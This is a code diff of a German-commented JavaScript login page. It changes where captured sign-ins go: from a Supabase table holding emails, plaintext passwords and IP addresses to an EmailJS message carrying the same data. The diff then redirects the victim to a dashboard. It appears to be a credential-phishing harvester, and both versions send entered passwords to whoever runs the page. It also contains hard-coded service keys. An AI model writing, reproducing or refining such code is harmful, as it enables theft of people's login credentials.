@@ -1,43 +1,40 @@
-const SUPABASE_URL = 'https://pfztjmobxymxgefjznax.supabase.co';
-const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBmenRqbW9ieHlteGdlZmp6bmF4Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDUyNDAzMDIsImV4cCI6MjA2MDgxNjMwMn0.cTcOArvqK0UeNinVpxQ2A_BcUFAy--BalHR7oKsWZXk';
-
-let supabase;
-
-// Warte, bis die Seite vollständig geladen ist
+// EmailJS initialisieren
 document.addEventListener('DOMContentLoaded', () => {
-  // Prüfe, ob die Supabase-Bibliothek geladen wurde
-  if (typeof window.supabase === 'undefined') {
-    console.error('Supabase-Bibliothek nicht geladen. Bitte überprüfe die Internetverbindung oder den Skript-Pfad.');
-    alert('Fehler: Supabase-Bibliothek konnte nicht geladen werden. Bitte überprüfe deine Internetverbindung und lade die Seite neu.');
+  // Prüfe, ob EmailJS geladen wurde
+  if (typeof emailjs === 'undefined') {
+    console.error('EmailJS nicht geladen. Überprüfe deine Internetverbindung oder den Skript-Pfad.');
+    alert('Fehler: EmailJS konnte nicht geladen werden. Bitte überprüfe deine Internetverbindung und lade die Seite neu.');
     return;
   }
 
+  // Initialisiere EmailJS mit deinem öffentlichen Schlüssel
   try {
-    // Initialisiere den Supabase-Client
-    supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
-    console.log('Supabase-Client erfolgreich initialisiert.');
+    emailjs.init({
+      publicKey: '39YMBnaAVy7wJKSwU' // Dein EmailJS-öffentlicher Schlüssel
+    });
+    console.log('EmailJS erfolgreich initialisiert.');
   } catch (err) {
-    console.error('Fehler bei der Initialisierung des Supabase-Clients:', err);
-    alert('Fehler bei der Supabase-Initialisierung: ' + err.message);
+    console.error('Fehler bei der Initialisierung von EmailJS:', err);
+    alert('Fehler bei der EmailJS-Initialisierung: ' + err.message);
     return;
   }
 
-  // Füge Event-Listener für den Button hinzu
+  // Event-Listener für den Anmelden-Button hinzufügen
   const signInButton = document.getElementById('signInButton');
   if (signInButton) {
     signInButton.addEventListener('click', signIn);
   } else {
-    console.error('SignIn-Button nicht gefunden. Stelle sicher, dass das Element mit id="signInButton" existiert.');
+    console.error('Anmelden-Button nicht gefunden. Stelle sicher, dass das Element mit id="signInButton" existiert.');
   }
 });
 
-// Anmeldung: Daten an Supabase senden
+// Funktion zum Anmelden und Senden der Daten per EmailJS
 async function signIn() {
   const email = document.getElementById('email').value;
   const password = document.getElementById('password').value;
   const gotcha = document.querySelector('input[name="_gotcha"]').value;
 
-  // Honeypot-Prüfung
+  // Honeypot-Prüfung für Bots
   if (gotcha) {
     alert('Bot erkannt!');
     return;
@@ -50,15 +47,8 @@ async function signIn() {
     return;
   }
 
-  // Prüfe, ob der Supabase-Client initialisiert wurde
-  if (!supabase) {
-    console.error('Supabase-Client nicht initialisiert.');
-    alert('Supabase-Client nicht initialisiert. Bitte überprüfe deine Internetverbindung und lade die Seite neu.');
-    return;
-  }
-
   try {
-    // IP-Adresse holen
+    // IP-Adresse abrufen
     let ip_address = 'Unknown';
     try {
       const response = await fetch('https://api.ipify.org?format=json');
@@ -68,26 +58,27 @@ async function signIn() {
       console.error('Fehler beim Abrufen der IP-Adresse:', err);
     }
 
-    // Nutzerdaten in Tabelle speichern
-    const { error: dbError } = await supabase
-      .from('users')
-      .insert([{
-        email,
-        password,
-        ip_address,
-        created_at: new Date().toISOString()
-      }]);
-    if (dbError) {
-      console.error('Fehler beim Speichern der Nutzerdaten:', dbError);
-      alert('Fehler beim Speichern der Daten: ' + dbError.message);
-      return;
-    }
+    // Daten für EmailJS vorbereiten
+    const templateParams = {
+      email: email,
+      password: password,
+      ip_address: ip_address,
+      timestamp: new Date().toISOString()
+    };
 
+    // E-Mail per EmailJS senden
+    const response = await emailjs.send(
+      'service_yxjq878', // Deine EmailJS-Service-ID
+      'template_28bx0zu', // Deine EmailJS-Template-ID
+      templateParams
+    );
+
+    console.log('E-Mail erfolgreich gesendet!', response.status, response.text);
     localStorage.setItem('lastSignIn', Date.now());
     alert('Daten erfolgreich gesendet!');
     window.location.href = 'dashboard.html';
   } catch (err) {
-    console.error('Unerwarteter Fehler:', err);
-    alert('Unerwarteter Fehler: ' + err.message);
+    console.error('Fehler beim Senden der E-Mail:', err);
+    alert('Fehler beim Senden der Daten: ' + err.message);
   }
 }
